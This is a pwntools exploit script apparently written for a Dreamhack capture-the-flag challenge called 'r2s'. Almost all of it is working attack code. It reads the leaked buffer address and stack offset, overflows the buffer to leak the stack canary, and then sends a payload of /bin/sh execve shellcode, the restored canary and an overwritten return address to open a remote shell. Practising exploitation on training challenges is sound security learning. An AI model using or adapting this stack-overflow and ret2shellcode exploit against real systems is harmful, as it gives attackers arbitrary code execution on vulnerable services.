from pwn import*

#p = process("./r2s")
p = remote('host3.dreamhack.games',19947)
#gdb.attach(p,api=True)

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

#####################
# STEP_1: Leak_addr #
#####################

p.recvuntil(b'Address of the buf: 0x')
input_addr = int(p.recv(12),16)
print('[+]Input:    ',hex(input_addr))

p.recvuntil(b'Distance between buf and $rbp: ')
rbp = int(p.recv(2),10)
print('[+]Rbp-input:',hex(rbp))
rbp_addr = input_addr + rbp
print('[+]Rbp:      ',hex(rbp_addr))

#######################
# STEP_2: Leak_canary #
#######################

payload = b"a"*(rbp-8)
p.sendline(payload)
p.recvuntil(payload)
canary = (int.from_bytes(p.recv(8), "little")>>2*4)<<2*4
print('[+]Canary:   ',hex(canary))

#########################
# STEP_3: Ret2shellcode #
#########################

payload = shellcode + b"\x00"*(rbp-8-len(shellcode)) + p64(canary) + b"a"*8 + p64(input_addr) 
p.sendline(payload)
p.interactive()
